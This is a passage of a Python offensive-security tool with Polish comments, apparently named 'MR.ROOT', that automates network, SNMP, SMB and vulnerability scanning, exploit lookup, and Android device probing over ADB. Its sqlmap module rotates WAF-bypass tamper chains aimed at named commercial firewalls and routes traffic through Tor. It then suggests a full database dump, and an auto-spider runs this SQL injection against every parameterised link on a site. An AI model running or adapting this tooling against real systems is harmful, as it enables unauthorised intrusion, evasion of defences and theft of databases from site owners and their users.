                res[name.lower()] = raw

                if name == "mDNS" and raw != "brak danych":
                    raw_lower = raw.lower()
                    ios_hits  = [s for s in _MDNS_IOS     if s in raw_lower]
                    and_hits  = [s for s in _MDNS_ANDROID if s in raw_lower]
                    if ios_hits:
                        res["mobile_os_hint"] = f"Prawdopodobnie iOS (mDNS: {', '.join(ios_hits)})"
                    elif and_hits:
                        res["mobile_os_hint"] = f"Prawdopodobnie Android (mDNS: {', '.join(and_hits)})"
        except Exception as e:
            res[name.lower()] = f"error: {e}"

    log("info", "SMB (TCP/139,445)...")
    try:
        nm.scan(hosts=ip, arguments="-p 139,445 --script smb-os-discovery,smb-enum-shares -T4 --host-timeout 30s")
        if ip in nm.all_hosts():
            tcp = nm[ip].get("tcp", {})
            for port in [445, 139]:
                if port in tcp:
                    scripts   = tcp[port].get("script", {})
                    res["smb"] = {
                        "os_discovery": scripts.get("smb-os-discovery", ""),
                        "shares":       scripts.get("smb-enum-shares", "")
                    }
                    break
    except Exception as e:
        res["smb"] = {"error": str(e)}

    div = c(C.CYAN+C.BOLD, "═" * 50)
    print(f"\n{div}\n{c(C.CYAN+C.BOLD, f'  KARTA URZĄDZENIA: {ip}')}\n{div}")
    _card_row("Hostname", res["hostname"])
    _card_row("mDNS",     res["mdns"],    C.GREEN)
    _card_row("NetBIOS",  res["netbios"], C.GREEN)
    if res["smb"]:
        _card_row("SMB OS",    res["smb"].get("os_discovery"), C.YELLOW)
        _card_row("SMB Share", res["smb"].get("shares"),       C.YELLOW)
    _card_row("UPnP", res["upnp"], C.CYAN)
    if res.get("mobile_os_hint"):
        print(c(C.GREEN+C.BOLD, f"  📱 {'OS Hint':<10}: {res['mobile_os_hint']}"))
    print(div + "\n")

    ts  = now()
    out = f"{REPORT_DIR}/identity_{ip_to_filename(ip)}_{ts}.json"
    with open(out, "w", encoding="utf-8") as f:
        json.dump(res, f, indent=2, ensure_ascii=False)
    log("ok", f"Raport: {out}")
    return res

def _card_row(label, value, color=C.WHITE):
    if not value or str(value).strip() in ["brak danych", "None", ""]:
        return
    lines = str(value).strip().splitlines()
    print(c(C.DIM, f"  {label:<10}:") + " " + c(color, lines[0][:110]))
    for line in lines[1:8]:
        print(c(color, f"              {line[:110]}"))
    if len(lines) > 8:
        print(c(C.DIM, f"              ... (+{len(lines)-8} linii)"))

# =========================
# SNMP SCAN
# =========================
def snmp_scan(ip):
    log("scan", f"SNMP Scan: {c(C.WHITE+C.BOLD, ip)}")
    nm  = nmap.PortScanner()
    res = {"ip": ip, "community": None, "data": {}}
    found_community = None
    snmp_data = {}

    for community in SNMP_COMMUNITIES:
        try:
            nm.scan(
                hosts=ip,
                arguments=(
                    f"-sU -p 161 --script snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr"
                    f" --script-args snmp.community={community} -T4 --host-timeout 20s"
                )
            )
            if (ip in nm.all_hosts()
                    and 161 in nm[ip].get("udp", {})
                    and nm[ip]["udp"][161].get("state") in ["open", "open|filtered"]):
                scripts = nm[ip]["udp"][161].get("script", {})
                if scripts:
                    found_community = community
                    snmp_data = scripts
                    log("ok", f"Community string działa: {c(C.GREEN+C.BOLD, community)}")
                    break
        except Exception:
            continue

    if not found_community:
        log("warn", "SNMP niedostępny lub odrzucono community strings.")
        return res

    res.update({"community": found_community, "data": snmp_data})
    div = c(C.CYAN+C.BOLD, "═" * 55)
    print(f"\n{div}\n{c(C.CYAN+C.BOLD, f'  SNMP INFO: {ip}  [community: {found_community}]')}\n{div}")
    for key, val in snmp_data.items():
        print(c(C.GREEN+C.BOLD, f"\n  [{key}]"))
        lines = str(val).splitlines()
        for line in lines[:20]:
            print(c(C.WHITE, f"    {line}"))
        if len(lines) > 20:
            print(c(C.DIM, f"    ... (+{len(lines)-20} linii)"))
    print(f"\n{div}\n")
    return res

# =========================
# VULN SCAN
# =========================
def vuln_scan(ip):
    log("scan", f"Vuln-Scan NSE: {c(C.WHITE+C.BOLD, ip)}")

    if FULL_PORTS:
        port_arg = "-p-"
        log("warn", "Tryb --full-ports: skanowanie wszystkich 65535 portów (wolno na telefonie).")
    else:
        port_arg = "--top-ports 1000"
        log("info", "Skanowanie top-1000 portów. Użyj --full-ports dla pełnego skanowania.")

    log("warn", "To może potrwać chwilę...")
    nm  = nmap.PortScanner()
    res = {"ip": ip, "vulns": []}

    try:
        nm.scan(
            hosts=ip,
            arguments=f"-sV {port_arg} --script {','.join(VULN_SCRIPTS)} {NMAP_DEEP}"
        )
    except Exception as e:
        log("err", f"Vuln scan error: {e}")
        return res

    if ip not in nm.all_hosts():
        log("warn", "Host niedostępny")
        return res

    host       = nm[ip]
    vuln_found = []
    print()

    for proto in host.all_protocols():
        for port in sorted(host[proto]):
            for script_name, output in host[proto][port].get("script", {}).items():
                if not output:
                    continue
                if "VULNERABLE" in output.upper() or "State: VULNERABLE" in output:
                    vuln_found.append({"port": port, "script": script_name, "output": output})
                    print(c(C.RED+C.BOLD, f"\n  ⚠  PODATNOŚĆ [{script_name}] PORT {port}"))
                    for line in output.splitlines()[:10]:
                        print(c(C.YELLOW, f"     {line}"))
                else:
                    print(c(C.DIM, f"  [{script_name}:{port}] {output.splitlines()[0][:100]}"))

    print()
    if not vuln_found:
        log("ok", "Brak wykrytych podatności NSE")
    else:
        log("vuln", f"Wykryto {c(C.RED+C.BOLD, str(len(vuln_found)))} podatności!")
    res["vulns"] = vuln_found
    return res

# =========================
# HTTP BASIC (helper)
# =========================
def grab_http_basic(ip):
    results = []
    host_part = f"[{ip}]" if is_ipv6(ip) else ip
    for proto in ["http", "https"]:
        try:
            url = f"{proto}://{host_part}"
            req = urllib.request.Request(url, headers={"User-Agent": random.choice(USER_AGENTS)})
            ctx = get_ssl_ctx()
            res = urllib.request.urlopen(req, timeout=3, context=ctx)
            results.append({
                "url":    url,
                "status": res.status,
                "server": res.headers.get("Server", ""),
                "body":   res.read(512).decode("utf-8", errors="ignore")
            })
        except Exception:
            continue
    return results

# =========================
# DEEP SCAN
# =========================
def deep_scan(ip):
    cache_key = f"deep_{ip}"
    if cache_key in CACHE:
        log("cache", f"{ip} — pobrano z cache")
        return CACHE[cache_key]

    log("scan", f"Deep Scan: {c(C.WHITE+C.BOLD, ip)}")
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=ip, arguments=f"-F -sV -O {NMAP_FAST}")
    except Exception as e:
        return {"ip": ip, "error": str(e)}

    if ip not in nm.all_hosts():
        log("warn", f"{ip} — down")
        return {"ip": ip, "status": "down"}

    host    = nm[ip]
    os_name = host["osmatch"][0]["name"] if host.get("osmatch") else "unknown"
    ports   = [
        {
            "port":    port,
            "proto":   proto,
            "service": host[proto][port].get("name", ""),
            "product": host[proto][port].get("product", ""),
            "version": host[proto][port].get("version", "")
        }
        for proto in host.all_protocols()
        for port  in sorted(host[proto])
        if host[proto][port]["state"] == "open"
    ]

    http_info = grab_http_basic(ip)
    try:
        hostname = socket.gethostbyaddr(ip)[0]
    except Exception:
        hostname = None

    div = c(C.CYAN+C.BOLD, "─" * 55)
    print(f"\n{div}\n{c(C.CYAN+C.BOLD, f'  {ip}')}\n{div}")
    print(c(C.WHITE, f"  OS       : {os_name}\n  Hostname : {hostname or '—'}\n  Porty    :"))
    for p in ports:
        port_proto = f"{p['port']}/{p['proto']}"
        ver = f"{p['product']} {p['version']}".strip()
        print(f"    {c(C.GREEN, port_proto):<22}{c(C.CYAN, p['service']):<16} {c(C.DIM, ver)}")
    for h in http_info:
        print(f"    {c(C.YELLOW, '→ HTTP')} {h['url']} [{c(C.GREEN if h['status'] < 400 else C.YELLOW, str(h['status']))}] {c(C.DIM, h['server'])}")

    exploits_by_port = {}
    ports_with_version = [p for p in ports if p.get("product")]
    if ports_with_version:
        print()
        log("info", f"SearchSploit: sprawdzanie {len(ports_with_version)} usług z wykrytą wersją...")
        for p in ports_with_version:
            product = p.get("product", "").strip()
            version = p.get("version", "").strip()
            if not product:
                continue

            exploits = searchsploit_lookup(product, version)
            if exploits:
                exploits_by_port[p["port"]] = exploits
                count = len(exploits)
                label = f"{product} {version}".strip()
                log("vuln", f"  Port {c(C.RED+C.BOLD, str(p['port']))}: {c(C.YELLOW+C.BOLD, str(count))} exploit(ów) dla {c(C.WHITE, label)}")
                for ex in exploits[:5]:
                    etype = f"[{ex['type']}/{ex['platform']}]" if ex.get("type") else ""
                    print(f"      {c(C.RED, '→')} EDB-{ex['edb_id']:<6} {c(C.YELLOW, ex['title'][:70])} {c(C.DIM, etype)}")
                if count > 5:
                    print(c(C.DIM, f"      ... i {count - 5} więcej w raporcie JSON"))
            else:
                log("ok", f"  Port {p['port']} ({product} {version}): brak exploitów w bazie")

    print(div)

    result = {
        "ip": ip, "hostname": hostname, "os": os_name,
        "ports": ports, "http": http_info,
        "exploits": exploits_by_port,
        "timestamp": now()
    }
    CACHE[cache_key] = result
    return result

def save_deep_outputs(results):
    ts = now()
    out = f"{REPORT_DIR}/scan_{ts}.json"
    with open(out, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    log("ok", f"Zapisano główny skan: {out}")

def run_scan(targets):
    results = []
    with ThreadPoolExecutor(max_workers=MAX_PARALLEL_NMAP) as ex:
        future_to_ip = {ex.submit(deep_scan, ip): ip for ip in targets}

        done, not_done = wait(future_to_ip.keys(), timeout=SCAN_TIMEOUT)

        if not_done:
            log("warn", f"Timeout {SCAN_TIMEOUT}s — anulowano {len(not_done)} zadań:")
            for fut in not_done:
                log("warn", f"  ✗ {future_to_ip[fut]} (timeout)")
                fut.cancel()

        for fut in done:
            try:
                results.append(fut.result())
            except Exception as e:
                log("err", str(e))

    save_cache(CACHE)
    save_deep_outputs(results)

# =========================
# FULL SCAN — wszystkie moduły
# =========================
FULL_SCAN_PHASES = [
    ("1/6", "Deep Scan",     "deep"),
    ("2/6", "Identity Scan", "identity"),
    ("3/6", "SNMP Scan",     "snmp"),
    ("4/6", "Banner Grabber","banner"),
    ("5/6", "Fuzzer",        "fuzz"),
    ("6/6", "Vuln-Scan NSE", "vuln"),
]

def _phase_header(phase_num, name):
    div = c(C.CYAN+C.BOLD, "═" * 60)
    label = c(C.CYAN+C.BOLD, f"  [{phase_num}] {name}")
    skip  = c(C.DIM, "  Ctrl+C = pomiń tę fazę, przejdź do następnej")
    print(f"\n{div}\n{label}\n{skip}\n{div}")

def full_scan(ip, wordlist_file=None):
    ts_start = datetime.datetime.now()
    report   = {
        "ip":         ip,
        "started_at": ts_start.strftime("%Y-%m-%d %H:%M:%S"),
        "deep":       None,
        "identity":   None,
        "snmp":       None,
        "banner":     None,
        "fuzz":       None,
        "vuln":       None,
        "skipped":    [],
        "finished_at": None,
        "duration_s":  None,
    }

    master_div = c(C.GREEN+C.BOLD, "█" * 60)
    print(f"\n{master_div}")
    print(c(C.GREEN+C.BOLD,  f"  ▶  FULL SCAN: {ip}"))
    print(c(C.DIM,           f"  Faz: {len(FULL_SCAN_PHASES)} | Ctrl+C = pomiń fazę | Ctrl+C×2 = wyjdź"))
    print(f"{master_div}\n")

    for phase_num, phase_name, phase_key in FULL_SCAN_PHASES:
        _phase_header(phase_num, phase_name)
        try:
            if   phase_key == "deep":     report["deep"]     = deep_scan(ip)
            elif phase_key == "identity": report["identity"] = identity_scan(ip)
            elif phase_key == "snmp":     report["snmp"]     = snmp_scan(ip)
            elif phase_key == "banner":   report["banner"]   = banner_grabber(ip)
            elif phase_key == "fuzz":     report["fuzz"]     = fuzz_scan(ip, wordlist_file)
            elif phase_key == "vuln":     report["vuln"]     = vuln_scan(ip)
        except KeyboardInterrupt:
            print()
            log("warn", f"Faza [{phase_num}] {phase_name} — POMINIĘTA przez użytkownika.")
            report["skipped"].append(phase_key)
            time.sleep(0.3)

    ts_end = datetime.datetime.now()
    duration = (ts_end - ts_start).seconds
    report["finished_at"] = ts_end.strftime("%Y-%m-%d %H:%M:%S")
    report["duration_s"]  = duration

    mins, secs = divmod(duration, 60)
    print(f"\n{master_div}")
    print(c(C.GREEN+C.BOLD, f"  ✔  FULL SCAN ZAKOŃCZONY: {ip}"))
    print(c(C.DIM,          f"  Czas: {mins}m {secs}s"))

    if report["skipped"]:
        print(c(C.YELLOW, f"  Pominięte fazy: {', '.join(report['skipped'])}"))

    ts_str   = ts_start.strftime("%Y%m%d_%H%M%S")
    out_file = f"{REPORT_DIR}/fullscan_{ip_to_filename(ip)}_{ts_str}.json"
    try:
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
        print(c(C.GREEN, f"  Raport: {out_file}"))
    except Exception as e:
        log("err", f"Nie zapisano raportu: {e}")

    print(f"{master_div}\n")
    return report

# =========================
# [v3.4] FULL SCAN SIECI
# =========================
def full_scan_network(network=None, wordlist_file=None):
    master_div = c(C.GREEN+C.BOLD, "█" * 60)
    print(f"\n{master_div}")
    print(c(C.GREEN+C.BOLD, "  ▶  FULL SCAN SIECI"))
    print(c(C.DIM,          "  Krok 1: Ping Sweep → Krok 2: Full Scan każdego hosta"))
    print(f"{master_div}\n")

    alive = ping_sweep(network)
    if not alive:
        log("warn", "Brak aktywnych hostów — przerywam.")
        return []

    print()
    log("info", f"Znaleziono {c(C.GREEN+C.BOLD, str(len(alive)))} hostów do przeskanowania:")
    for i, h in enumerate(alive, 1):
        mob  = "📱" if h.get("mobile") else "💻"
        name = h.get("hostname") or "—"
        print(f"  {c(C.DIM, str(i)+'.'):>5} {mob} {c(C.WHITE+C.BOLD, h['ip']):<18} {c(C.DIM, name)}")

    print()
    log("warn", f"Full Scan każdego hosta może zająć {len(alive) * 5}–{len(alive) * 15} minut.")
    try:
        ans = input(c(C.YELLOW, "[?] Kontynuować? [T/n]: ")).strip().lower()
    except (KeyboardInterrupt, EOFError):
        print()
        log("info", "Anulowano.")
        return []

    if ans not in ["", "t", "y", "tak", "yes"]:
        log("info", "Anulowano przez użytkownika.")
        return []

    ts_start  = datetime.datetime.now()
    all_reports = []
    total     = len(alive)

    for idx, host in enumerate(alive, 1):
        ip = host["ip"]
        mob_tag = "📱" if host.get("mobile") else "💻"

        print(f"\n{master_div}")
        print(c(C.GREEN+C.BOLD, f"  {mob_tag}  HOST {idx}/{total}: {ip}"))
        print(f"{master_div}")

        try:
            report = full_scan(ip, wordlist_file)
            report["_sweep_info"] = host
            all_reports.append(report)
        except KeyboardInterrupt:
            print()
            log("warn", f"Host {ip} — POMINIĘTY (Ctrl+C). Kontynuuję od następnego...")
            all_reports.append({"ip": ip, "skipped": True, "_sweep_info": host})
            time.sleep(0.4)

    ts_end   = datetime.datetime.now()
    duration = int((ts_end - ts_start).total_seconds())
    mins, secs = divmod(duration, 60)

    ts_str      = ts_start.strftime("%Y%m%d_%H%M%S")
    master_file = f"{REPORT_DIR}/netscan_{ts_str}.json"
    master_data = {
        "network":     network or "auto",
        "started_at":  ts_start.strftime("%Y-%m-%d %H:%M:%S"),
        "finished_at": ts_end.strftime("%Y-%m-%d %H:%M:%S"),
        "duration_s":  duration,
        "hosts_total": total,
        "hosts_scanned": len([r for r in all_reports if not r.get("skipped")]),
        "hosts_skipped": len([r for r in all_reports if r.get("skipped")]),
        "reports": all_reports,
    }
    try:
        with open(master_file, "w", encoding="utf-8") as f:
            json.dump(master_data, f, indent=2, ensure_ascii=False, default=str)
    except Exception as e:
        log("err", f"Nie zapisano raportu master: {e}")

    print(f"\n{master_div}")
    print(c(C.GREEN+C.BOLD, f"  ✔  FULL SCAN SIECI ZAKOŃCZONY"))
    print(c(C.DIM,          f"  Hostów: {total} | Przeskanowanych: {master_data['hosts_scanned']} | Pominiętych: {master_data['hosts_skipped']}"))
    print(c(C.DIM,          f"  Czas: {mins}m {secs}s"))
    print(c(C.GREEN,        f"  Raport master: {master_file}"))
    print(f"{master_div}\n")

    return all_reports

# =========================
# [v3.5] SQLMAP AUTO-TAMPER WAF-BYPASS MODULE
# =========================
def sql_scan(url):
    """
    Komenda: sql <URL>
    Rotuje 6 najlepszych łańcuchów tamperów 2025/2026, uruchamia sqlmap
    z poziomem 5/risk 3, wykrywa podatność na żywo i zapisuje raport JSON.
    """
    log("scan", f"SQLMap Auto-Tamper WAF-Bypass: {c(C.WHITE+C.BOLD, url)}")

    # Sprawdzenie sqlmap
    try:
        subprocess.check_output(["sqlmap", "--version"], stderr=subprocess.STDOUT, timeout=5)
    except (FileNotFoundError, subprocess.TimeoutExpired, subprocess.CalledProcessError):
        log("err", "sqlmap nie jest zainstalowany.")
        log("info", "Zainstaluj: apt install sqlmap  (lub pkg install sqlmap w Termux)")
        return {"url": url, "vulnerable": False, "error": "sqlmap missing"}

    # [v3.6] Sprawdź dostępność proxy (Tor / lista proxy)
    proxy_arg = None
    tor_proxies = ["socks5://127.0.0.1:9050", "http://127.0.0.1:8118"]
    for tor_proxy in tor_proxies:
        try:
            scheme = tor_proxy.split("://")[0]
            host   = tor_proxy.split("://")[1].split(":")[0]
            port   = int(tor_proxy.split(":")[-1])
            with socket.create_connection((host, port), timeout=2):
                proxy_arg = tor_proxy
                log("ok", f"Proxy aktywne: {c(C.GREEN+C.BOLD, tor_proxy)}")
                break
        except Exception:
            continue
    if not proxy_arg:
        log("warn", "Proxy niedostępne — skanowanie bez proxy (Tor/Privoxy wyłączony?)")

    # [v3.6] Rozszerzone łańcuchy tamperów — 8 chainów 2025/2026
    tamper_chains = [
        # Oryginalne (v3.5) — sprawdzone vs ModSecurity CRS
        "apostrophemask,space2comment,equaltolike,randomcase,between",
        "charencode,charunicodeescape,space2ifs,apostrophenullencode,base64encode",
        "modsecurityversioned,versionedmorekeywords,space2comment,equaltolike,bluecoat",
        "apostrophemask,space2comment,equaltolike,between,randomcase,charunicodeescape",
        "space2comment,replacequotes,unmagicquotes,hex2char,modsecurityversioned",
        "apostrophemask,space2ifs,equaltolike,randomcase,between,versionedkeywords",
        # [v3.6] Nowe — randomcase + versionedmorekeywords vs Cloudflare WAF
        "randomcase,versionedmorekeywords,space2mysqlblank,equaltolike,apostrophemask",
        # [v3.6] Agresywny bypass dla F5/Imperva — Unicode + multiline komentarze
        "charunicodeescape,charencode,space2mssqlblank,randomcase,between,equaltolike",
    ]

    log("info", f"Rozpoczynam rotację {len(tamper_chains)} łańcuchów tamperów")
    log("warn", "Parametry: --level=5 --risk=3 | --batch | --random-agent | --flush-session")

    vulnerable = False
    best_tamper = None
    tested = 0

    for idx, tamper in enumerate(tamper_chains, 1):
        tested += 1
        log("scan", f"[{idx}/{len(tamper_chains)}] Testuję chain: {c(C.YELLOW, tamper)}")

        _ua, _hdrs = _smart_headers(url)
        _header_str = "\n".join(
            f"{k}: {v}" for k, v in _hdrs.items()
            if k.lower() not in ("user-agent", "connection")
        )
        
        cmd = [
            "sqlmap", "-u", url,
            "--batch", "--random-agent",
            "--no-flush-session" if SQL_RESUME else "--flush-session",  # [v3.7] --resume flag
            f"--tamper={tamper}",
            "--level=5", "--risk=3",
            "--dbs", "--threads=3",
            "--timeout=20", "--retries=2",
            "--disable-coloring",
            "--delay=1",
            "--answers=quit=N",
        ]
        
        if _header_str:
            cmd += [f"--headers={_header_str}"]  # [v3.6] zapobiega interaktywnym pytaniom o wyjście

        # [v3.6] Dodaj proxy jeśli dostępne
        if proxy_arg:
            cmd += [f"--proxy={proxy_arg}"]

        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )

            for line in iter(process.stdout.readline, ""):
                clean = line.strip()
                if not clean:
                    continue

                # Live detection
                if any(kw in clean.lower() for kw in [
                    "is vulnerable", "parameter is vulnerable",
                    "fetching database names", "available databases",
                    "sqlmap identified the following"
                ]):
                    vulnerable = True
                    best_tamper = tamper
                    log("vuln", f"{c(C.RED+C.BOLD, '[!] SQL INJECTION POTWIERDZONA')} z tamperem: {c(C.GREEN, tamper)}")
                    print(c(C.RED, f"     → {clean[:120]}"))
                    break

                if "WARNING" in clean or "CRITICAL" in clean:
                    print(c(C.YELLOW, f"     {clean[:100]}"))

            process.wait(timeout=240)

            if vulnerable:
                break

        except subprocess.TimeoutExpired:
            log("warn", f"Chain {idx} timeout — zabijam proces")
            process.kill()
        except Exception as e:
            log("err", f"Błąd podczas wykonywania sqlmap: {e}")
            continue

    print(c(C.CYAN+C.BOLD, "─" * 65))

    if vulnerable and best_tamper:
        log("vuln", "SUKCES — podatność potwierdzona najlepszym tamperem:")
        log("vuln", f"    → {c(C.GREEN+C.BOLD, best_tamper)}")
        log("info", f"Rekomendacja ręczna:")
        proxy_hint = f" --proxy={proxy_arg}" if proxy_arg else ""
        log("info", f"  sqlmap -u \"{url}\" --tamper={best_tamper} --dump-all --level=5 --risk=3{proxy_hint}")
    else:
        log("ok", "Żaden z łańcuchów nie potwierdził podatności (lub WAF jest bardzo twardy).")
        log("info", "Spróbuj ręcznie z --proxy, --tor lub wyższymi parametrami.")

    # Zapis raportu
    ts = now()
    safe_name = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in url)[:100]
    report_file = f"{REPORT_DIR}/sqlmap_{safe_name}_{ts}.json"

    report_data = {
        "url":              url,
        "timestamp":        ts,
        "vulnerable":       vulnerable,
        "best_tamper":      best_tamper,
        "tested_chains":    tested,
        "proxy_used":       proxy_arg,
        "scanner_version":  "MR.ROOT v3.8 REDHUNT-16-BETA | ADB-PENTEST"
    }

    try:
        with open(report_file, "w", encoding="utf-8") as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        log("ok", f"Raport zapisany: {report_file}")
    except Exception as e:
        log("err", f"Błąd zapisu raportu: {e}")

    return report_data

# =========================
# [v3.5] AUTO-SPIDER & SQL INJECTION
# =========================
def spider_and_sql(start_url):
    """
    Komenda: auto-sql <URL>
    Wchodzi na start_url, wyciąga wszystkie linki href, deduplikuje wektory
    ataku po sygnaturze (ścieżka + klucze parametrów GET), a następnie
    odpala sql_scan() na każdym unikalnym endpoincie.
    Zero zewnętrznych zależności — tylko stdlib (re, urllib.parse).
    """
    log("scan", f"Auto-Spider & SQLi: {c(C.WHITE+C.BOLD, start_url)}")

    # Krok 1: pobierz stronę startową
    try:
        req = urllib.request.Request(
            start_url,
            headers={"User-Agent": random.choice(USER_AGENTS)}
        )
        ctx = get_ssl_ctx()
        res = urllib.request.urlopen(req, timeout=8, context=ctx)
        html = res.read().decode("utf-8", errors="ignore")
    except Exception as e:
        log("err", f"Błąd pobierania strony docelowej: {e}")
        return

    # Krok 2: wyciągnij wszystkie href
    hrefs = re.findall(r'href=[\'"]?([^\'" >]+)', html)
    target_domain = urlparse(start_url).netloc

    log("info", f"Znalezionych linków href: {c(C.WHITE+C.BOLD, str(len(hrefs)))}")

    # Krok 3: filtruj i deduplikuj
    # Sygnatura = (ścieżka_pliku, frozenset_kluczy_parametrów)
    # np. /list.php?id=1&cat=2  →  ('/list.php', frozenset({'id', 'cat'}))
    # Dzięki temu ?id=1 i ?id=99 dają ten sam klucz → skanowane raz
    attack_surface = {}  # signature → pełny URL

    for href in hrefs:
        full_url = urljoin(start_url, href)
        parsed   = urlparse(full_url)

        # Tylko ta sama domena i tylko URL-e z parametrami GET
        if parsed.netloc != target_domain:
            continue
        if not parsed.query:
            continue

        params_keys = tuple(sorted(parse_qs(parsed.query).keys()))
        if not params_keys:
            continue

        signature = (parsed.path, params_keys)
        if signature not in attack_surface:
            attack_surface[signature] = full_url

    if not attack_surface:
        log("warn", "Spider nie znalazł żadnych linków z parametrami GET (np. ?id=...).")
        log("info", "Upewnij się, że strona zawiera formularze/linki z parametrami.")
        return

    total_targets = len(attack_surface)
    log("ok", f"Unikalnych wektorów ataku: {c(C.GREEN+C.BOLD, str(total_targets))}")
    print()

    # Krok 4: wyświetl tabelę wektorów
    div = c(C.BLUE+C.BOLD, "═" * 65)
    print(div)
    print(c(C.BLUE+C.BOLD, "  AUTO-SPIDER — MAPA WEKTORÓW ATAKU"))
    print(div)
    for i, (sig, target_url) in enumerate(attack_surface.items(), 1):
        path, params = sig
        params_str = ", ".join(params)
        print(f"  {c(C.DIM, str(i)+'.'):>5} {c(C.YELLOW, path):<40} params: {c(C.CYAN, params_str)}")
        print(f"        {c(C.DIM, target_url[:90])}")
    print(div + "\n")

    # Krok 5: odpala sql_scan na każdym unikalnym wektorze
    for idx, (sig, target_url) in enumerate(attack_surface.items(), 1):
        print(f"\n{c(C.RED+C.BOLD, '█'*60)}")
        log("info", f"Wektor {idx}/{total_targets}: {c(C.YELLOW+C.BOLD, target_url)}")
        print(f"{c(C.RED+C.BOLD, '█'*60)}\n")
        sql_scan(target_url)

    # Podsumowanie
    print(f"\n{c(C.GREEN+C.BOLD, '█'*60)}")
    log("ok", f"Auto-Spider zakończył pracę. Sprawdzono {total_targets} unikalnych wektorów.")
    print(f"{c(C.GREEN+C.BOLD, '█'*60)}\n")



# =========================
# [v3.8] ADB PENTEST MODULE
# =========================

def _adb(serial, *args, timeout=15):
    """
    Uruchamia polecenie ADB. Jeśli serial != None, używa -s <serial>.
    Zwraca (stdout_str, returncode).
    """
    cmd = ["adb"]
    if serial:
        cmd += ["-s", serial]
    cmd += list(args)
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", -1
    except FileNotFoundError:
        return "", -2   # adb nie zainstalowane


def _adb_check_available():
    """Sprawdza czy adb jest w PATH."""
    return shutil.which("adb") is not None


def _adb_get_devices():
    """
    Zwraca listę podłączonych urządzeń ADB:
      [{"serial": "...", "state": "device|unauthorized|offline"}]
    """
    stdout, rc = _adb(None, "devices")
    devices = []
    for line in stdout.splitlines()[1:]:
        line = line.strip()
        if not line or line.startswith("*"):
            continue
        parts = line.split()
        if len(parts) >= 2:
            devices.append({"serial": parts[0], "state": parts[1]})
    return devices


def _adb_device_info(serial):
    """
    Pobiera szczegóły urządzenia przez 'adb shell getprop'.
    Zwraca słownik z kluczowymi właściwościami.
    """
    PROPS = [
        ("ro.product.brand",          "brand"),
        ("ro.product.manufacturer",   "manufacturer"),
        ("ro.product.model",          "model"),
        ("ro.product.device",         "device"),
        ("ro.build.version.release",  "android_version"),
        ("ro.build.version.sdk",      "sdk"),
        ("ro.product.cpu.abi",        "abi"),
        ("ro.build.fingerprint",      "fingerprint"),
        ("ro.build.type",             "build_type"),       # user/userdebug/eng
        ("ro.debuggable",             "debuggable"),       # 0/1
        ("ro.secure",                 "secure"),           # 0/1
        ("ro.boot.verifiedbootstate", "verified_boot"),    # green/yellow/orange/red
        ("persist.sys.usb.config",    "usb_config"),       # mtp,adb itd.
        ("ro.build.tags",             "build_tags"),       # release-keys/dev-keys
        ("service.adb.tcp.port",      "adb_tcp_port"),     # ADB WiFi
    ]

    info = {}
    for prop, key in PROPS:
        out, _ = _adb(serial, "shell", "getprop", prop)
        info[key] = out or "?"

    selinux, _  = _adb(serial, "shell", "getenforce")
    info["selinux"] = selinux or "?"

    kernel, _   = _adb(serial, "shell", "uname", "-r")
    info["kernel"] = kernel or "?"

    whoami, _   = _adb(serial, "shell", "whoami")
    info["shell_user"] = whoami or "?"

    su_test, rc = _adb(serial, "shell", "su", "-c", "id")
    info["root_shell"] = "TAK ✅" if rc == 0 and "uid=0" in su_test else "NIE ❌"

    return info


def _adb_apk_enum(serial):
    """
    Enumeruje zainstalowane aplikacje.
    Zwraca: {"user_apps": [...], "system_apps": [...], "interesting": [...]}
    """
    results = {"user_apps": [], "system_apps": [], "interesting": []}

    out, _ = _adb(serial, "shell", "pm", "list", "packages", "-f", "-3", timeout=30)
    for line in out.splitlines():
        if "=" in line:
            pkg  = line.split("=", 1)[-1].strip()
            path = line.split("package:")[1].split("=")[0].strip() if "package:" in line else ""
            results["user_apps"].append({"package": pkg, "path": path})

    out_s, _ = _adb(serial, "shell", "pm", "list", "packages", "-f", "-s", timeout=30)
    for line in out_s.splitlines():
        if "=" in line:
            pkg  = line.split("=", 1)[-1].strip()
            path = line.split("package:")[1].split("=")[0].strip() if "package:" in line else ""
            results["system_apps"].append({"package": pkg, "path": path})

    all_pkgs = [a["package"] for a in results["user_apps"] + results["system_apps"]]
    for pkg in all_pkgs:
        for interesting in _INTERESTING_PACKAGES:
            if interesting.lower() in pkg.lower():
                results["interesting"].append(pkg)
                break

    return results


def _adb_debug_surface(serial, info):
    """
    Analizuje powierzchnię ataku debug.
    Zwraca listę findings: [{"severity": "HIGH/MED/INFO", "finding": "..."}]
    """
    findings = []

    if info.get("debuggable") == "1":
        findings.append({
            "severity": "HIGH",
            "finding": "ro.debuggable=1 — build debuggable! Wszystkie apki debugowalne przez JDWP."
        })

    if info.get("secure") == "0":
        findings.append({
            "severity": "HIGH",
            "finding": "ro.secure=0 — powłoka ADB działa jako root bez su!"
        })

    bt = info.get("build_type", "")
    if bt in ("userdebug", "eng"):
        findings.append({
            "severity": "HIGH",
            "finding": f"build_type={bt} — nie jest to produkcyjny build 'user'. Zwiększona powierzchnia ataku."
        })

    tags = info.get("build_tags", "")
    if tags and "release-keys" not in tags and tags != "?":
        findings.append({
            "severity": "MED",
            "finding": f"build_tags={tags} — nie są to klucze release. Możliwe odblokowanie bootloadera."
        })

    vb = info.get("verified_boot", "")
    if vb and vb not in ("green", "?"):
        findings.append({
            "severity": "MED",
            "finding": f"Verified Boot state={vb} — bootloader odblokowany lub partycja zmodyfikowana."
        })

    usb = info.get("usb_config", "")
    if "adb" in usb:
        findings.append({
            "severity": "MED",
            "finding": f"usb_config={usb} — ADB aktywne przez USB. Urządzenie dostępne bez odblokowania ekranu."
        })

    tcp_port = info.get("adb_tcp_port", "")
    if tcp_port and tcp_port not in ("?", "-1", ""):
        findings.append({
            "severity": "HIGH",
